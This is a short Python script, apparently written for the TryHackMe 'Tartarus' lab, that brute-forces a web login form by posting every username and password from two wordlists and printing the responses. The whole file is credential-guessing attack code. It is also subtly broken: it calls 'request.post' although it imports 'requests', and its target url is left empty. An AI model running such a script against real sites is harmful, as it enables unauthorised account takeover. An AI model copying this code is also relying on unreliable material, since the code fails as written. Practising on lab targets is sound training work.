#!/usr/bin/env python3

# See TryHackMe! Tartarus - Website Password Bruteforcing.

import requests

url = ""

with open("usernames", "r") as h:
	usernames = [line.strip() for line in h.read().split("\n") if line]
with open("passwords", "r") as h:
	passwords = [line.strip() for line in h.read().split("\n") if line]

def login(username, password):
	r = request.post(url, data = {
			"username": username,
			"password": password,
			"submit": "Login",
		})
	return r

#print(login("user", "pass").text)

def bruteUser():
	for user in usernames:
		response = login(user, "anything").text
		print(f"Username {user}: {response}")

def brutePassword(username):
	for password in passwords:
		response = login(username, password).text
		print(f"Username {username}, Password {password}: {response}")
